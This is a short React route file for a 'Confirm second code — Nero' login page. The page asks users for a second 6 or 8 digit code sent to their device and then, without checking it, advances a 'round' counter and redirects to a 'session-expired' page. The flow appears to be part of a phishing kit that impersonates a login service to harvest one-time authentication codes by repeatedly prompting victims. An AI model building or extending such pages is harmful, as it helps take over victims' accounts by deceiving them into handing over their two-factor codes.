import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { CodeStep } from "@/components/nero/CodeStep";
import { advanceRound } from "@/lib/nero-flow";

export const Route = createFileRoute("/code-2")({
  head: () => ({
    meta: [
      { title: "Confirm second code — Nero" },
      { name: "description", content: "Enter the second 6 or 8 digit code to confirm your Nero login." },
      { property: "og:title", content: "Confirm second code — Nero" },
      { property: "og:description", content: "Enter the second 6 or 8 digit code to confirm your Nero login." },
    ],
  }),
  component: CodeTwoPage,
});

function CodeTwoPage() {
  const navigate = useNavigate();
  return (
    <CodeStep
      step={2}
      title="Confirm your second code"
      description="One more code to finish. Enter the second 6 or 8 digit code sent to your device."
      onSubmit={() => {
        advanceRound();
        navigate({ to: "/session-expired" });
      }}
    />
  );
}